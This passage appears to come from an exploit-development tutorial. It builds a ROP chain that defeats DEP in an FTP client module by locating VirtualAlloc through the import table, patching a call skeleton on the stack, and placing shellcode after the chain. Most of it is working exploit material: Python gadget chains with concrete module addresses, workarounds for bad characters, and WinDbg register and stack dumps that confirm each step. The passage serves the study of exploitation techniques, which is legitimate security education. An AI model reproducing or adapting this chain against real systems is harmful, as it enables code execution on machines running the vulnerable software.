</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0245e2</span>f0 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">06651</span>db0 ecx<span style="color:#f92672">=</span>ffffffe4 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051579</span>c esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0245e320</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac pe cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000217</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48fe</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051579</span>c c3              ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dd eax L1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0245e2</span>f0  <span style="color:#ae81ff">45454545</span> <span style="color:#ae81ff">46464646</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">48484848</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0245e300</span>  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0245e30</span>c <span style="color:#ae81ff">5050118</span>e
</span></span></code></pre></div><p>With the correct value in EAX, we need to move that value back to ESI so we can use it in the next stages. We can do this with a gadget containing “PUSH EAX” and “POP ESI” instructions:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5050118e</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax,esi ; pop esi ; retn  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x42424242</span>)) <span style="color:#960050;background-color:#1e0010">#</span> junk  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0xffffffe4</span>)) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1C</span>  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50537d5b</span>)) <span style="color:#960050;background-color:#1e0010">#</span> push eax ; pop esi ; ret
</span></span></code></pre></div><p>This way we can use EAX while ESI contains the calculated address.
The next step is to get the VirtualAlloc address of the IAT and load it into a register.</p>
<h2 id="2-fetching-the-location-of-the-virtualalloc-address-in-the-iat-via-rop">2. Fetching the location of the VirtualAlloc address in the IAT via ROP</h2>
<p>We previously found that the IAT address for VirtualAlloc is 0x5054A220, <strong>but we must remember that 0x20 is a bad character for our exploit.</strong>
To solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value.
First, we will use a POP EAX instruction to fetch the modified IAT address into EAX.
Then, we will pop -0x01 into ECX through a POP ECX instruction.
Lastly, we will add the value of ECX into EAX, which will be like substracting 0x01 into EAX to obtain our desired value.
<strong>Note how we are going to reused the previous gadgets as they are still useful:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051680a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop eax ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0xFFFFFFFF</span>)) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x01</span>  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5054A221</span>)) <span style="color:#960050;background-color:#1e0010">#</span> VirtualAlloc address in IAT of module  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret
</span></span></code></pre></div><p>This way, <code>eax</code> will contain the IAT address where <code>VirtualAlloc</code> is located. But we want to access such memory address to get the real location of the function. We manage to do this by referencing the register:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051f278</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax, dword [eax] ; ret
</span></span></code></pre></div><p>This way, the value inside <code>eax</code> (IAT pointer) is obtained and stored in <code>eax</code>. Now, <code>eax</code> contains the real address of VirtualAlloc:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a220 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">064f</span>b018 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a221 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0102e2</span>f0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">278</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0102e33</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac po cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000213</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe3da</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">278</span> <span style="color:#ae81ff">8</span>b00            mov     eax,dword ptr [eax]  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5054</span>a220<span style="color:#f92672">=</span>{KERNEL32<span style="color:#f92672">!</span><span style="color:#a6e22e">VirtualAllocStub</span> (<span style="color:#ae81ff">76605680</span>)}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">76605680</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">064f</span>b018 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a221 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0102e2</span>f0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">27</span>a esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0102e33</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac po cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000213</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe3dc</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">27</span>a c3              ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> u eax
</span></span><span style="display:flex;"><span>KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605680</span> <span style="color:#ae81ff">8</span>bff            mov     edi,edi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605682</span> <span style="color:#ae81ff">55</span>              push    ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605683</span> <span style="color:#ae81ff">8</span>bec            mov     ebp,esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605685</span> <span style="color:#ae81ff">5</span>d              pop     ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605686</span> ff2540b86676    jmp     dword ptr [KERNEL32<span style="color:#f92672">!</span><span style="color:#a6e22e">_imp__VirtualAlloc</span> (<span style="color:#ae81ff">7666</span>b840)]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7660568</span>c cc              <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7660568</span>d cc              <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7660568</span>e cc              <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">3</span>
</span></span></code></pre></div><p>We successfully jumped to the <code>VirtualAlloc</code> function! <code>eax</code> contains a pointer to this value.</p>
<h2 id="3-patching-virtualalloc-address-with-the-obtained-one">3. Patching VirtualAlloc address with the obtained one</h2>
<p>The last step is to replace the value we have in the location pointed by <code>esi</code>, which is the address in the stack that holds the dummy value of VirtualAlloc, for this obtained value.
If we think a bit, a <code>mov [esi], eax</code> gadget will be enough:</p>
<pre tabindex="0"><code>0x50524ea4: mov dword [esi], eax ; ret  ;  (1 found)
</code></pre><p>Let&rsquo;s add this gadget in our ROP chain and see the final value of the address pointed by <code>esi</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">76605680</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span>db7a8 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a221 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>be2f0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50524</span>ea4 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>be340 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac po cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000213</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14006</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50524</span>ea4 <span style="color:#ae81ff">8906</span>            mov     dword ptr [esi],eax  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00f</span>be2f0<span style="color:#f92672">=</span><span style="color:#ae81ff">45454545</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">76605680</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span>db7a8 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a221 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>be2f0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50524</span>ea6 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>be340 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac po cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000213</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14008</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50524</span>ea6 c3              ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> dds esi L1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2f0  <span style="color:#ae81ff">76605680</span> KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub
</span></span></code></pre></div><p>If we inspect the stack (a bit down as we have inserted a lot of gadgets) we can see that the address pointed by <code>esi</code> is the dummy value, that has been replaced with the correct value of <code>VirtualAlloc</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> dds esp <span style="color:#f92672">-</span> <span style="color:#ae81ff">54</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2ec  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2f0  <span style="color:#ae81ff">76605680</span> KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub <span style="color:#75715e">// [esi] pointed here, we managed to overwrite this value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">00f</span>be2f4  <span style="color:#ae81ff">46464646</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2f8  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2fc  <span style="color:#ae81ff">48484848</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be300  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be304  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be308  <span style="color:#ae81ff">00f</span>be30c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be30c  <span style="color:#ae81ff">5050118</span>e CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x118e</span> <span style="color:#75715e">// These are our ROP gadgets and values
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">00f</span>be310  <span style="color:#ae81ff">42424242</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be314  <span style="color:#ae81ff">505115</span>a3 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x705</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be318  ffffffe4
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be31c  <span style="color:#ae81ff">5051579</span>a CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48fc</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be320  <span style="color:#ae81ff">00f</span>be2f0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be324  <span style="color:#ae81ff">5053</span>a0f5 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x29257</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be328  ffffffff
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be32c  <span style="color:#ae81ff">505115</span>a3 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x705</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be330  <span style="color:#ae81ff">5054</span>a221 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x39383</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be334  <span style="color:#ae81ff">5051579</span>a CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48fc</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be338  <span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">278</span> CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe3da</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be33c  <span style="color:#ae81ff">50524</span>ea4 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14006</span>
</span></span></code></pre></div><h1 id="patching-the-return-address-our-shellcode-using-rop">Patching the return address (our shellcode) using ROP</h1>
<p>Remember that we inserted a dummy address prior to the call to VirtualAlloc? This is the dummy address that will be in the top of the stack when VirtualAlloc executes the <code>ret</code> instruction. As we haven&rsquo;t performed a call instruction as we are jumping via gadgets, we have to push the dummy address manually.
Now, we pushed a dummy address, that we need to patch with the dynamic address of where our shellcode is located. We will do basically the same as we did with VirtualAlloc: First, we must align ESI with the placeholder value for the return address on the stack. Then we need to dynamically locate the address of the shellcode and use it to patch the placeholder value.</p>
<p><strong>Note: We can avoid starting from 0 as when the last ROP chain was executed, ESI was storing the address of VirtualAlloc, which is 4 bytes lower than the return address.</strong> Remember what information do your register contain in order to reuse it. An instruction like <code>add esi, 0x04</code> would be great but it&rsquo;s not available in this module.
In our case, we can find an INC ESI instruction. It&rsquo;s not clean, but there are several gadgets that can do not have bad side effects, like the following:</p>
<pre tabindex="0"><code>rop += pack(&#34;&lt;L&#34;, (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
</code></pre><p>Note that the INC instruction increments the register by one byte, so we have to add the instruction four times in order to increment esi by four bytes. The side effect will only modify EAX, which we do not have to worry about at this point:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Step 2. Modify the shellcode address, return address, for our dynamically obtained shellcode address.  </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Substract 4 bytes from ESI so it points to our dummy shellcode address in stack (0x46464646)  </span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#75715e"># inc esi ; add al, 0x2B ; ret  </span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#75715e"># inc esi ; add al, 0x2B ; ret  </span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#75715e"># inc esi ; add al, 0x2B ; ret  </span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#75715e"># inc esi ; add al, 0x2B ; ret</span>
</span></span></code></pre></div><p>Once the four gadgets are executed, if we take a look at esi, it points to our controlled shellcode dummy value in the stack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">006</span><span style="color:#f92672">&gt;</span> dd esi L1 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d4fe304 <span style="color:#ae81ff">46464646</span>
</span></span></code></pre></div><p>With ESI aligned correctly, we need to get the shellcode address in EAX so that we can reuse the “<code>MOV DWORD [ESI], EAX ; RET</code>” gadget to patch the placeholder value. The issue we face now is that we do not know the exact address of the shellcode since it will be placed after our ROP chain, which we haven’t finished creating yet. Note that we don&rsquo;t know where our shellcode will be as we will place it <strong>after the ROP chain, and not before it, as we have been doing in the previous buffer overflow techniques.</strong></p>
<p>The approach to patch the value after we have placed all the ROP gadgets is using the value in ESI and adding a fixed value to it. Once we finish building the ROP chain, we can update the fixed value to correctly align with the beginning of the shellcode.</p>
<p>First, we need to copy ESI into EAX. We need to do this in such a way that we keep the existing value in ESI in a register like EAX as a backup, since we need it there to patch the placeholder value.
The idea is to:</p>
<ul>
<li>have in ESI the address of the pointer to our shellcode</li>
<li>have in EAX the address of our shellcode
So then we can fix <code>[ESI] with EAX</code> properly. Now we will use a dummy EAX value, like <code>ESI</code> minus a certain fixed offset, just to have the gadgets properly stored in the stack. We will replace the offset value afterwards.
An instruction like “MOV EAX, ESI” is optimal, but unfortunately, the only gadgets containing this instruction also pop a value into ESI. We can however solve this by restoring the value in ESI with the previously-used “PUSH EAX ; POP ESI ; RET” gadget. This way we can do the following:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5050118e</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax, esi ; pop esi ; ret  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x42424242</span>)) <span style="color:#960050;background-color:#1e0010">#</span> junk  
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5052f773</span>)) <span style="color:#960050;background-color:#1e0010">#</span> push eax ; pop esi ; ret
</span></span></code></pre></div><p>We basically have now the same value in ESI and EAX.
Now, we add the offset to EAX. Remember that it is a dummy offset. <strong>Note: Do not use badchars for the offsets, even if they are dummy. For example, instead 0x200, use 0x210.</strong></p>
<pre tabindex="0"><code>rop += pack(&#34;&lt;L&#34;, (0x505115a3)) # pop ecx ; ret  
rop += pack(&#34;&lt;L&#34;, (0xfffffdf0)) # -0x210  
rop += pack(&#34;&lt;L&#34;, (0x50533bf4)) # sub eax, ecx ; ret
</code></pre><p>Here we have substracted EAX 210 bytes (dummy quantity). Once we know the exact offset from ESI to the shellcode, we can update the 0xfffffdf0 value to the correct one. At this point, EAX contains a placeholder address for our shellcode, which we can update once we finish building the entire ROP chain.</p>
<p><strong>Note: See how we have reused several gadgets for this section! Not only gadgets, but also the value of the registers that are already stored due to prior gadget chains.</strong></p>
<h1 id="patching-arguments-to-virtualalloc">Patching arguments to VirtualAlloc</h1>
<p>We have successfully created and executed a partial ROP chain that locates the address of VirtualAlloc from the IAT and the shellcode address, and then updates the API call skeleton on the stack.</p>
<p>In this section, we must patch all four arguments required by VirtualAlloc to disable DEP.
Let&rsquo;s recap the function prototype of VirtualAlloc:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">VirtualAlloc</span>(
</span></span><span style="display:flex;"><span>[in, optional] LPVOID lpAddress,
</span></span><span style="display:flex;"><span>[in] SIZE_T dwSize,
</span></span><span style="display:flex;"><span>[in] DWORD flAllocationType,
</span></span><span style="display:flex;"><span>[in] DWORD flProtect );
</span></span></code></pre></div><p>Normally, we want the following:</p>
<ul>
